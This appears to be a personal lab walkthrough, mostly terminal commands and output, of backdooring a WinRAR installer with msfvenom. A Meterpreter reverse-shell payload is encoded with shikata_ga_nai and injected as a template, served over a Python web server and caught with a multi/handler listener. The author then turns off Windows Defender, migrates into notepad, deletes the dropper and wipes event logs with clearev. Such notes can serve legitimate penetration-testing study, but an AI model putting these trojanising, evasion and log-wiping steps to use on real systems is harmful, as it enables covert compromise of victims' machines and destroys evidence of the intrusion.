# we can see that have `-x` flag which allows us to inject payload into a executable or w can say use that executable as a template

`    -x, --template        <path>     Specify a custom executable file to use as a template`

We can also utilise `-k` in conjunction with it

`    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread`

┌──(kali㉿kali)-[~]
└─$ `msfvenom`                                                                                                                
Error: No options
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message

# So first we need to find a Portable executable in this example we will user `Winrar` executable (the 32 bit setup file we can download from google)

┌──(kali㉿kali)-[~/Downloads]
└─$ ls
'code_1.84.1-1699275408_amd64(1).deb'   code_1.84.1-1699275408_amd64.deb   lab_Doshiji.ovpn   sakshamdoshi.ovpn   VulnOSv2.7z   winPEASx64.exe   winrar-x32-624.exe
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ file winrar-x32-624.exe 
winrar-x32-624.exe: PE32 executable (GUI) Intel 80386, for MS Windows
                                                                                                                                                                                                                                            
# Now lets create a payload with 10 iteration of shikata_ga_nai encoding and inject it into this executable

┌──(kali㉿kali)-[~/Downloads]
└─$ `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/winrar-x32-624.exe > ~/Downloads/winrar.exe`

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 3311280 bytes
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ `ls`
'code_1.84.1-1699275408_amd64(1).deb'   code_1.84.1-1699275408_amd64.deb   lab_Doshiji.ovpn   sakshamdoshi.ovpn   VulnOSv2.7z   winPEASx64.exe   winrar.exe   winrar-x32-624.exe
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ `file winrar.exe `       
winrar.exe: PE32 executable (GUI) Intel 80386, for MS Windows


# Now we only need to transfer this to target, so for this example we will simply host a python web server
┌──(kali㉿kali)-[~/Downloads]
└─$ `python -m simplehttpserver 80 `                                                                  
/usr/bin/python: No module named simplehttpserver

NOTE - SimpleHTTPServer is for python2, so you're getting the error. In python3, The following works:python -m http.server [<portNo>]

┌──(kali㉿kali)-[~/Downloads]
└─$ `python -m http.server 80`
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

# Now lets setup our listener

msf6 > `use multi/handler`
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > `set LHOST 192.168.46.130`
LHOST => 192.168.46.130
msf6 exploit(multi/handler) > `set LPORT 1234`
LPORT => 1234
msf6 exploit(multi/handler) > `run`

[*] Started reverse TCP handler on 192.168.46.130:1234 

# Now Go to the Target (windows machine) and access the webserver from browser to download file

──(kali㉿kali)-[~/Security]
└─$ `python -m http.server 80 `                                                                                                                                     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.204.131 - - [09/Jan/2024 11:14:58] "GET /winrar.exe HTTP/1.1" 200 -
192.168.204.131 - - [09/Jan/2024 11:16:44] "GET /winrar.exe HTTP/1.1" 304 -


Now below is what actually happend when I did this in todays windows 10 with Windows defender, It blocked this download with this message

`Detected Trojan:Win32/Meterpreter`
`Status: Removed`

This means Windows Defender AV is smart enough to detect this type of paloads even if you encode and inject in legitimate executables

Now lets consioder a Vulnerable Windows machine on which 
Real-Time Protection -OFF
Cloud Delivered Protection-OFF

# We get the response

msf6 exploit(multi/handler) > `run`

[*] Started reverse TCP handler on 192.168.204.130:1234 
[*] Sending stage (175686 bytes) to 192.168.204.131
[*] Meterpreter session 1 opened (192.168.204.130:1234 -> 192.168.204.131:49965) at 2024-01-09 11:17:35 -0500

meterpreter > `sysinfo`
Computer        : DESKTOP-N3F8SBO
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getpid
Current pid: 3240
meterpreter > getuid
Server username: DESKTOP-N3F8SBO\Sam

# Now since we have access to target , we can migrate to another process, this basically shipts our meterpreter payload to diffrent process which helps us to evade , we can do it by command `migrate` or post module `post/windows/manage/migrate`

meterpreter > `run post/windows/manage/migrate`

[*] Running module against DESKTOP-N3F8SBO
[*] Current server process: winrar.exe (3240)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 4976
[+] Successfully migrated into process 4976
meterpreter > getuid
Server username: DESKTOP-N3F8SBO\Sam
meterpreter > getpid
Current pid: 4976
meterpreter > 

# We can now delete our actual file with payload and also clear event logs

meterpreter > `ls`
Listing: C:\Users\Sam\Downloads
===============================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100666/rw-rw-rw-  282      fil   2024-01-09 10:04:50 -0500  desktop.ini
100777/rwxrwxrwx  3311280  fil   2024-01-09 11:16:55 -0500  winrar.exe

meterpreter > `rm winrar.exe `
meterpreter > `ls`
Listing: C:\Users\Sam\Downloads
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2024-01-09 10:04:50 -0500  desktop.ini

meterpreter > `clearev`
[*] Wiping 771 records from Application...
[*] Wiping 362 records from System...
[*] Wiping 908 records from Security...
meterpreter > 


# Now We can also use the `k` to maintain the behaviour of winrar file as well as inject payload, but this is not allowed in all executables infact not in winrar also if we see below we get error `Error: The template file doesn't have any exports to inject into!`

`    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread`

┌──(kali㉿kali)-[~/Security]
└─$ `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.204.130 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/winrar-x32-624.exe > winrar.exe`
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Error: The template file doesn't have any exports to inject into!
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Security]
└─$ 
